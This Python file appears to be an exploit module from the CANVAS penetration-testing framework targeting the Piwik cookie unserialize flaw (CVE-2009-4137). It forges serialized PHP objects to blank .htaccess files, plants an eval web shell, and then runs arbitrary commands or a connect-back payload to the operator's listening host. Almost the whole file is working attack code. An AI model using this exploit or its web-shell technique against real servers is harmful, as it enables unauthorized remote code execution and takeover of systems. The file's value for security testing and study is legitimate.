#! /usr/bin/env python
"""
Piwik Unserialize Exploit - uses the ExploitTypes/php_unserialize.py library
to exploit vulnerable versions of Piwik.

"""
import sys
if "." not in sys.path: sys.path.append(".")

import time

from exploitutils import *
from ExploitTypes.php_multi import *
from ExploitTypes.php_serialize import *

import libs.spkproxy as spkproxy
import canvasengine
import urllib
import re
import base64

NAME="Piwik unserialize() + __destruct"
DESCRIPTION="Piwik Remote Code Execution"
VERSION="1.0"
DOCUMENTATION={}
DOCUMENTATION['Date public']='12/9/2009'
DOCUMENTATION['References']=['http://www.sektioneins.com/en/advisories/advisory-032009-piwik-cookie-unserialize-vulnerability/','http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-4137']
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['CVE Name']='CVE-2009-4137'
DOCUMENTATION['Notes']='''

This exploit gets a remote shell from vulnerable piwik installation (Piwik <= 0.4.5).

You will probably need to break out of safe mode for this as well.

'''


PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""
Exploits http://www.sektioneins.de/en/advisories/advisory-032009-piwik-cookie-unserialize-vulnerability/index.html
Discovered by Esser.

Nulls any existing .htaccess files to allow execution of code in writeable directories.

Esser uses stacked old school php://filter's to ensure only our data gets written to our file - a neat trick.

To get the older piwik you have to do a bit of googling: You may find it just easier to visit:
http://builds.piwik.org/

"""


class theexploit(php_multi):
    def __init__(self):
        php_multi.__init__(self)
        self.port=80
        self.host=""
        self.setVersions()
        self.version=0
        self.done=0
        self.ssl=""
        self.name=NAME
        self.basepath="/"
        self.basepaths=["/piwik/","/"]
        self.command=None 
        self.basicauth_user=""
        self.basicauth_password=""
        self.hostname=None
        self.content_type="text/plain"
        self.foundstrings=["var piwik","<title>Piwik"]
        self.testfile="index.php?module=CoreHome&action=index&idSite=1&period=day&date=yesterday"
        return

    def gen_htaccess_null(self, dir):
        code = "\n\n"
        code = self.feel_the_bass(code, 5)
        path = 'php://filter/write=convert.base64-decode/resource='
        path = path + path + path + path + path + dir
        return self.gen_attaq_cookie(code, path)

    def gen_endgame_cookie(self, location):
        code = "if(isset($_POST['piwik'])) { eval($_POST['piwik']); }"
        # props here
        code = 'Z' + base64.b64encode(base64.b64encode('0k6k5xUxz')) + self.feel_the_bass("<?php " + code + "?>", 5)
        path = 'php://filter/write=convert.base64-decode/resource='
        path = path + path + path + path + path + location
        return self.gen_attaq_cookie(code, path)

    def gen_attaq_cookie(self, code, path):
        cookie = ize_phpObject("Piwik_Config")
        cookie.add_prot_var("configFileUpdated", True)
        cookie.add_prot_var("doWriteFileWhenUpdated", True)
        cookie.add_prot_var("pathIniFileUserConfig", path)

        cookie.add_prot_var("userConfig", ize_phpHash({}))
        cookie.class_vars["\\0*\\0userConfig"].add_element(code, ize_phpObject("Zend_Config"))

        cookie = str(cookie)
        # dont need to escape thanks to b64
        cookie = cookie.replace('\\0', '\0').strip("\n")
        return "Login=" + base64.b64encode(cookie)

    def feel_the_bass(self, exp, num):
        for i in range(num):
            exp = base64.b64encode(exp)
        return exp

    def request1(self):
        self.UA.ClearCookies()
        self.log("nulling potential htaccess at ./tmp/cache/")
        cookie = self.gen_htaccess_null('./tmp/cache/.htaccess')
        #self.log('serialized payload: %s', cookie)
        self.UA.SetCookie("piwik_auth", cookie)
        self.UA.GET("index.php")
        return True

    def request2(self):
        self.UA.ClearCookies()
        self.log("nulling potential htaccess at ./tmp/")
        cookie = self.gen_htaccess_null('./tmp/.htaccess')
        #self.log('serialized payload: %s' % cookie)
        self.UA.SetCookie("piwik_auth", cookie)
        self.UA.GET("index.php")
        return True

    def request3(self):
        self.UA.ClearCookies()
        self.log("attempting to drop eval shell")
        cookie = self.gen_endgame_cookie('./tmp/cache/shell.php')
        #self.log('serialized payload: %s' % cookie)
        self.UA.SetCookie("piwik_auth", cookie)
        self.UA.GET("index.php")
        return True

    def request4(self):
        self.UA.ClearCookies()
        self.log("attempting to start CANVAS shell")
        if self.command:
            self.log("[+] Command: %s"%self.command)
            command=self.command
            command=self.encode_php(command).strip()
            data={}
            data["piwik"]="print(123);passthru('" + self.command + "');print(321);"
            ret = self.UA.POST("/tmp/cache/shell.php", data)
            if "123" in ret:
                result=ret.split("123")[1].split("321")[0]
                self.log("Command result=%s"%prettyprint(result))
                ret=1
            else:
                self.log("Command failed")
        else:
            command=self.get_php_to_mosdef()
            if not command:
                self.log("Error - not sending attack")
                return 0
            command=b64encode(command).strip()
            command=self.encode_php(command)
            self.log("[+] Command: %s"%command)
            data={}
            data["piwik"]="eval(base64_decode("+command+"));"
            data = self.UA.POST("/tmp/cache/shell.php",data,noresponse=True)
            #self.log("Data=%s"%data)
            self.log("[+] Looking for PHP connectback")
            time.sleep(3)
            ret=self.ISucceeded()
            return ret
        return ret


    def usage(self):
        print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -l 10.10.10.227 -d 9898"
        print "-t <target ip>"
        print "-p <target port>				[optional]"
        print "-O basepath: /path/to/piwik/      [optional]"
        print "-O hostname: target vhost       [optional]"
        print "-O command:commandtorun		 [optional]"
        print "-l call back ip if doing connect back"
        print "-d listening port for call back"
        return

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
